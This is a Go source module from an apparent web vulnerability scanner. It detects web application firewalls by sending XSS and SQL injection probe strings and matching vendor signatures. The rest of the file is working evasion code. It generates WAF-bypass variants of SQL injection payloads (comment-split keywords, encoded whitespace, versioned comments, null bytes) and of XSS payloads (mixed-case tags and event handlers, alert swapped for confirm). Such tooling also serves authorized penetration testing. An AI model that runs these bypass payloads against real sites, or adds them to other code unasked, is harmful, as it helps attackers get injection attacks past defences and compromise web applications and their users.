package modules

import (
	"bufio"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"

	"github.com/SentinelXofficial/sxel/internal/color"
	"github.com/SentinelXofficial/sxel/pkg/core"
)

type WAFDetectResult struct {
	Detected     bool
	Vendor       string
	Manufacturer string
	Evidence     string
}

func AutoDetectWAF(client *http.Client, cfg *core.Config, targetURL string) WAFDetectResult {
	q := url.Values{}
	q.Set("waf_probe", "<script>alert(1)</script>")
	q.Set("id", "1' OR '1'='1")
	sep := "?"
	if strings.Contains(targetURL, "?") {
		sep = "&"
	}
	probeURL := targetURL + sep + q.Encode()
	req, err := http.NewRequest("GET", probeURL, nil)
	if err != nil {
		return WAFDetectResult{}
	}
	core.ApplyHeaders(req, cfg)
	resp, err := client.Do(req)
	if err != nil {
		return WAFDetectResult{}
	}
	defer resp.Body.Close()
	bodyBytes := core.ReadBody(resp.Body)
	body := string(bodyBytes)
	cookieJar := ""
	for _, c := range resp.Cookies() {
		cookieJar += c.Name + "=" + c.Value + "\n"
	}
	for _, sig := range wafSignatures {
		for _, group := range sig.Groups {
			allMatch := true
			var ev []string
			for _, m := range group {
				ok, detail := evalWAFMatch(m, resp, body, cookieJar)
				if !ok {
					allMatch = false
					break
				}
				ev = append(ev, detail)
			}
			if allMatch {
				result := WAFDetectResult{Detected: true, Vendor: sig.Vendor, Manufacturer: sig.Manufacturer, Evidence: strings.Join(ev, ", ")}
				applyWAFMitigations(cfg, sig.Vendor, sig.Manufacturer)
				return result
			}
		}
	}
	genericCodes := map[int]bool{403: true, 406: true, 412: true, 429: true, 503: true}
	if genericCodes[resp.StatusCode] && strings.Contains(strings.ToLower(body), "blocked") {
		result := WAFDetectResult{Detected: true, Vendor: "Unknown WAF", Manufacturer: "unknown", Evidence: fmt.Sprintf("HTTP %d + 'blocked' in body", resp.StatusCode)}
		applyWAFMitigations(cfg, "Unknown WAF", "unknown")
		return result
	}
	return WAFDetectResult{Detected: false}
}

var (
	wafReCache      = map[string]*regexp.Regexp{}
	wafReMu         sync.RWMutex
	wafCacheMu      sync.Mutex
	wafBypassCached *bool
)

func wafCompile(pattern string) *regexp.Regexp {
	wafReMu.RLock()
	re, ok := wafReCache[pattern]
	wafReMu.RUnlock()
	if ok {
		return re
	}
	compiled, err := regexp.Compile("(?i)" + pattern)
	if err != nil {
		compiled, _ = regexp.Compile("(?i)" + regexp.QuoteMeta(pattern))
	}
	wafReMu.Lock()
	if existing, ok := wafReCache[pattern]; ok {
		re = existing
	} else {
		wafReCache[pattern] = compiled
		re = compiled
	}
	wafReMu.Unlock()
	return re
}

func evalWAFMatch(m wafMatch, resp *http.Response, body, cookieJar string) (bool, string) {
	switch m.Kind {
	case "header":
		for name, vals := range resp.Header {
			if !wafCompile(m.Name).MatchString(name) {
				continue
			}
			for _, v := range vals {
				if wafCompile(m.Pattern).MatchString(v) {
					return true, fmt.Sprintf("header %s=%s", name, v)
				}
			}
		}
	case "cookie":
		if cookieJar == "" {
			break
		}
		for _, line := range strings.Split(cookieJar, "\n") {
			if line != "" && wafCompile(m.Pattern).MatchString(line) {
				return true, fmt.Sprintf("cookie %s", m.Pattern)
			}
		}
	case "content":
		if body != "" && wafCompile(m.Pattern).MatchString(body) {
			return true, fmt.Sprintf("content %s", m.Pattern)
		}
	case "status":
		if m.Name != "" {
			code, err := strconv.Atoi(m.Name)
			if err == nil && resp.StatusCode == code {
				return true, fmt.Sprintf("status %d", code)
			}
		}
	case "reason":
		if resp.Status != "" && wafCompile(m.Pattern).MatchString(resp.Status) {
			return true, fmt.Sprintf("reason %s", resp.Status)
		}
	}
	return false, ""
}

func applyWAFMitigations(cfg *core.Config, vendor, manufacturer string) {
	wafCacheMu.Lock()
	cached := wafBypassCached
	wafCacheMu.Unlock()
	if cached != nil {
		cfg.WAFBypass = *cached
		return
	}
	fmt.Printf("%s WAF Detected: %s (%s)\n", color.BoldRed("[!]"), vendor, manufacturer)
	if !stdinIsTTY() {
		fmt.Printf("%s add --waf-bypass to enable bypass payload variants (non-interactive)\n", color.BoldYellow("[~]"))
		no := false
		wafCacheMu.Lock()
		wafBypassCached = &no
		wafCacheMu.Unlock()
		return
	}
	fmt.Printf("%s Enable Bypass WAF? [y/n]: ", color.BoldRed("[?]"))
	line, err := bufio.NewReader(os.Stdin).ReadString('\n')
	answer := strings.ToLower(strings.TrimSpace(line))
	yes := err == nil && (answer == "y" || answer == "yes" || answer == "")
	cfg.WAFBypass = yes
	wafCacheMu.Lock()
	wafBypassCached = &yes
	wafCacheMu.Unlock()
	if yes {
		fmt.Printf("%s WAF Bypass: ENABLED (payload variants + reduced request rate)\n", color.BoldGreen("[+]"))
	} else {
		fmt.Printf("%s continuing without bypass\n", color.BoldYellow("[~]"))
	}
}

func stdinIsTTY() bool {
	stat, err := os.Stdin.Stat()
	if err != nil {
		return false
	}
	return stat.Mode()&os.ModeCharDevice != 0
}

func WAFBypassSQL(payload string) []string {
	out := []string{payload}
	add := func(s string) {
		if s != payload {
			out = append(out, s)
		}
	}
	add(randCase(payload))
	add(strings.ReplaceAll(payload, " ", "/**/"))
	add(strings.ReplaceAll(payload, " ", "%09"))
	add(strings.ReplaceAll(payload, " ", "%0a"))
	add(strings.ReplaceAll(payload, " ", "%0d%0a"))
	up := strings.ToUpper(payload)
	for _, kw := range []string{"SELECT", "UNION", "WHERE", "FROM", "AND", "OR", "INSERT", "UPDATE"} {
		if len(kw) <= 2 {
			continue
		}
		idx := strings.Index(up, kw)
		if idx < 0 {
			continue
		}
		native := payload[idx : idx+len(kw)]
		split := native[:2] + "/**/" + native[2:]
		add(strings.ReplaceAll(payload, native, split))
	}
	if idx := strings.Index(up, "SELECT"); idx >= 0 {
		native := payload[idx : idx+6]
		add(strings.ReplaceAll(payload, native, "/*!50000"+native+"*/"))
	}
	if idx := strings.Index(up, "UNION"); idx >= 0 {
		native := payload[idx : idx+5]
		add(strings.ReplaceAll(payload, native, "UN/**/ION"))
	}
	add(payload + "%00")
	return dedup(out)
}

func WAFBypassXSS(payload string) []string {
	out := []string{payload}
	add := func(s string) {
		if s != payload {
			out = append(out, s)
		}
	}
	add(mixTagCase(payload))
	add(strings.ReplaceAll(payload, "<img src=x ", "<img/src=x/"))
	add(strings.ReplaceAll(payload, " onerror=", "/onerror="))
	for _, ev := range []string{"onerror", "onload", "onclick", "onfocus", "ontoggle", "onstart", "onmouseover"} {
		if strings.Contains(payload, ev) {
			add(strings.ReplaceAll(payload, ev, mixStr(ev)))
		}
	}
	add(strings.ReplaceAll(payload, "alert('XSS')", "confirm`XSS`"))
	add(strings.ReplaceAll(payload, "alert(1)", "confirm(1)"))
	add(strings.ReplaceAll(payload, "alert('XSS')", "alert`XSS`"))
	add(strings.ReplaceAll(payload, "\"", "&#34;"))
	add(strings.ReplaceAll(payload, "'XSS'", "`XSS`"))
	return dedup(out)
}

func randCase(s string) string {
	b := []byte(s)
	for i, c := range b {
		if c >= 'a' && c <= 'z' && rand.Intn(2) == 0 {
			b[i] = c - 32
		} else if c >= 'A' && c <= 'Z' && rand.Intn(2) == 0 {
			b[i] = c + 32
		}
	}
	return string(b)
}

func mixTagCase(s string) string {
	r := s
	for _, tag := range []string{"script", "img", "svg", "iframe", "body", "input", "details", "video", "audio", "marquee"} {
		upper := strings.ToUpper(tag[:1]) + tag[1:]
		r = strings.ReplaceAll(r, "<"+tag, "<"+upper)
		r = strings.ReplaceAll(r, "</"+tag, "</"+upper)
	}
	return r
}

func mixStr(s string) string {
	b := []byte(s)
	for i := range b {
		if i%2 == 0 && b[i] >= 'a' && b[i] <= 'z' {
			b[i] -= 32
		}
	}
	return string(b)
}

func dedup(ss []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, s := range ss {
		if !seen[s] {
			seen[s] = true
			out = append(out, s)
		}
	}
	return out
}
